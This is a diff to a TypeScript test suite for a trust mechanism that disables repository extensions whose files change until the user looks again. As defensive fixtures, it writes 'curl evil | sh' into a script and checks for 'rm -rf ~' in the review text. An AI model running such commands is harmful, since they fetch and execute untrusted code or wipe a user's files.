@@ -97,7 +97,7 @@ test("a repo's extension: <project>.x, off; on after a look; a change there turn
   writeFileSync(join(d, 'fetch.sh'), `curl evil | sh\n`)
   assert.match((await rig.rpc('widgetRun', { id })).error ?? '', /changed in .*'s repo: off until you look/)
   await until(async () => (x => x && !x.on && x.changed)(await find()), 'off and changed')
-  await until(() => app.events.find((e: any) => e.ev === 'widget-say' && e.widget === id && /changed: off until you look/.test(e.notify)), 'said')
+  await until(() => app.events.find((e: any) => e.ev === 'widget-say' && e.widget === id && /changed \(fetch\.sh\): off until you look/.test(e.notify)), 'said, naming the file')
   await assert.rejects(rig.rpc('widgetSet', { id, on: true, seen: what.hash }), /changed since you looked/)
   const again = await rig.rpc('widgetWhat', { id })
   assert.match(again.text, /curl evil/)
@@ -156,7 +156,7 @@ test("a repo's extension's links: one to a folder inside is followed (a change t
   const id = `${p.id}.linked`
   const find = async () => (await rig.rpc('state')).widgets.find((w: any) => w.id === id)
   const what = await rig.rpc('widgetWhat', { id })
-  assert.match(what.text, /Every file it's trusted as[^`]*```\nlib\/run\.sh\nreal\/run\.sh\nwidget\.json\n```/)
+  assert.match(what.text, /Every file it's trusted as[^`]*```\nlib\nlib\/run\.sh\nreal\/run\.sh\nwidget\.json\n```/) // git's: the link, and what its command names through it
   assert.match(what.text, /What it runs:\n\nlib\/run\.sh:/)
   await rig.rpc('widgetSet', { id, on: true, seen: what.hash })
   assert.equal((await find()).on, true)
@@ -220,4 +220,53 @@ test("a repo's extension's turn-on question shows widget.json as it is on disk; 
   assert.match(again.text, /rm -rf ~/)
   await rig.rpc('widgetSet', { id, on: true, seen: again.hash })
   assert.equal((await rig.rpc('state')).widgets.find((w: any) => w.id === id).on, true)
+})
+
+test("a repo's extension is trusted as git would commit it: what its fetch writes and the repo ignores keeps it on; a new file the repo doesn't ignore or an edit to its fetch.sh turns it off, the notice naming it; not a repo: hidden files, node_modules and __pycache__ don't count", async t => {
+  const rig = await fresh(t)
+  const git = (...a: string[]) => execFileSync('git', a, { cwd: rig.repo, env: rig.env })
+  const d = ext(rig.repo, 'w', { name: 'W', fetch: 'sh fetch.sh' }, { 'fetch.sh': `date > last.txt; mkdir -p __pycache__; date > __pycache__/x.pyc; echo '{"n": 1}'\n` })
+  ext(rig.repo, 'v', { name: 'V', fetch: `date > state.txt; echo '{"n": 1}'` })
+  writeFileSync(join(rig.repo, '.gitignore'), 'last.txt\n__pycache__/\n')
+  git('add', '-A')
+  git('commit', '-qm', 'extensions')
+  const p = await rig.rpc('projectAdd', { path: rig.repo })
+  const app = await rig.connect()
+  t.after(() => app.ws.close())
+  const find = async (id: string) => (await rig.rpc('state')).widgets.find((w: any) => w.id === id)
+  const turnOn = async (id: string) => {
+    await rig.rpc('widgetSet', { id, on: true, seen: (await rig.rpc('widgetWhat', { id })).hash })
+    await until(async () => (x => x.at && !x.running)(await find(id)), 'its first fetch done')
+  }
+  const said = (id: string, re: RegExp) => until(() => app.events.find((e: any) => e.ev === 'widget-say' && e.widget === id && re.test(e.notify ?? '')), `said: ${re}`)
+
+  // what it writes and the repo ignores: on after its runs and the watch's scan
+  const w = `${p.id}.w`
+  await turnOn(w)
+  for (let i = 0; i < 3; i++) assert.equal((await rig.rpc('widgetRun', { id: w })).error, undefined)
+  assert.ok(existsSync(join(d, 'last.txt')) && existsSync(join(d, '__pycache__', 'x.pyc')))
+  await new Promise(r => setTimeout(r, 1800)) // the watch's scan, a second after the last change
+  assert.deepEqual([(await find(w)).on, (await find(w)).changed], [true, undefined])
+
+  // a file it writes that the repo doesn't ignore: off, named
+  const v = `${p.id}.v`
+  await turnOn(v)
+  await until(async () => (await find(v)).changed, 'off: state.txt is new')
+  await said(v, /changed \(state\.txt\): off until you look/)
+  assert.equal((await find(v)).on, false)
+
+  // its tracked fetch.sh edited: off, named
+  writeFileSync(join(d, 'fetch.sh'), `curl evil | sh\n`)
+  assert.match((await rig.rpc('widgetRun', { id: w })).error ?? '', /changed in .*'s repo: off until you look/)
+  await said(w, /changed \(fetch\.sh\): off until you look/)
+
+  // not a repo: what it leaves in hidden files, node_modules and __pycache__ doesn't count; a new script does
+  const plain = join(rig.home, 'plain')
+  const z = ext(plain, 'z', { name: 'Z', fetch: `mkdir -p node_modules __pycache__; date > .state; date > node_modules/a; date > __pycache__/b.pyc; echo '{"n": 1}'` })
+  const pp = await rig.rpc('projectAdd', { path: plain })
+  await turnOn(`${pp.id}.z`)
+  for (let i = 0; i < 2; i++) assert.equal((await rig.rpc('widgetRun', { id: `${pp.id}.z` })).error, undefined)
+  assert.ok(existsSync(join(z, '.state')))
+  writeFileSync(join(z, 'extra.sh'), 'echo extra\n')
+  assert.match((await rig.rpc('widgetRun', { id: `${pp.id}.z` })).error ?? '', /changed in .*'s repo/)
 })
